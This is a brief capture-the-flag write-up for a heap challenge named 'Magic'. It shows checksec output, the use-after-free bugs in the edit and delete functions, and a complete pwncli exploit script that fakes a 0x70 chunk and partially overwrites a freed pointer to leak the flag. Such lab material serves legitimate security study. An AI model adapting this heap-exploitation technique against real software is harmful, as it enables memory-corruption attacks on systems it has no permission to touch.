# Magic
## checksec#
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

给的libc版本为2.23

## 漏洞点#
UAF两处：

```c
int edit()
{
    puts("Input the idx");
    int idx = get_int();
    puts("Input the Magic");
    read(0, ptrs[idx], size);
    printf("Magic> %s <Magic\n", ptrs[idx]);
}
```

```c
// 在删除功能中释放对应 chunk
free(ptrs[idx]);
puts("remove the Magic");
```

## exp#

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def add(idx):
    p.sendlineafter("Input your choice: \n", "1\n\n")
    p.sendlineafter("Input the idx\n", str(idx)+"\n\n")
    p.recvuntil("Search finished\n")


def edit(idx, data):
    p.sendlineafter("Input your choice: \n", "2\n\n")
    p.sendlineafter("Input the idx\n", str(idx)+"\n\n")
    p.sendafter("Input the Magic\n", data)
    p.recvuntil("Magic> ")
    m = p.recvuntil(" <Magic")
    info(f"Get msg: {m}")
    return m


def dele(idx):
    p.sendlineafter("Input your choice: \n", "3\n\n")
    p.sendlineafter("Input the idx\n", str(idx)+"\n\n")
    p.recvuntil("remove the Magic\n")


# alloc
add(0)
add(0)
add(0)
add(0)
add(1)

# prepare for a fake 0x70 chunk
edit(1, flat([0, 0, 0, 0x71]))
dele(1)
dele(0)

# partial overwrite 
edit(0, "\xe0")
add(0)
add(0)

# leak flag
edit(0, "a"*0x50)

p.interactive()
```